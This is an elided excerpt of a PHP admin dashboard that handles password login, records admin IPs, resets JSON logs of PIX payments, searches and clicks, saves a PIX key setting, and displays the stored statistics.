...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $admin_password) {
        ...
        $adminIps = [];
        if ($rawIps !== null) {
            $adminIps = json_decode($rawIps, true) ?: [];
        }
        if (!in_array($currentIp, $adminIps)) {
            $adminIps[] = $currentIp;
            app_storage_put('admin_ips.json', json_encode($adminIps, JSON_PRETTY_PRINT));
        }
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['reset_stats']) && $_POST['reset_stats'] === '1') {
        app_storage_put('pix_log.json', json_encode([], JSON_PRETTY_PRINT));
        app_storage_put('search_log.json', json_encode([], JSON_PRETTY_PRINT));
        app_storage_put('click_stats.json', json_encode(['consultar_clicks'=>0,'enter_clicks'=>0], JSON_PRETTY_PRINT));
        app_storage_put('pix_last.json', json_encode([], JSON_PRETTY_PRINT));
        ...
        if ($pixKey !== '') {
            ...
            app_storage_put('pix_config.json', json_encode($cfg, JSON_PRETTY_PRINT));
...
$pixEntries = [];
$rawPixLog = app_storage_get('pix_log.json');
if ($rawPixLog !== null) {
    $pixEntries = json_decode($rawPixLog, true) ?? [];
    // Sort by date desc
...
if ($rawSearchLog !== null) {
    $searchEntries = json_decode($rawSearchLog, true) ?? [];
    // Sort by date desc
...
$rawClickStats = app_storage_get('click_stats.json');
if ($rawClickStats !== null) {
    $clickStats = json_decode($rawClickStats, true) ?? $clickStats;
}
            ...
            <div class="space-y-8">
                ...
                <div class="card p-6 bg-gray-50">
                    ...
                    <ul class="text-xs space-y-2 text-gray-600">
                        ...
                        <li class="flex justify-between"><span>Log PIX Size:</span> <span class="font-mono"><?php echo app_storage_exists('pix_log.json') ? 'Ativo (Redis)' : 'Vazio'; ?></span></li>
                    </ul>
                </div>
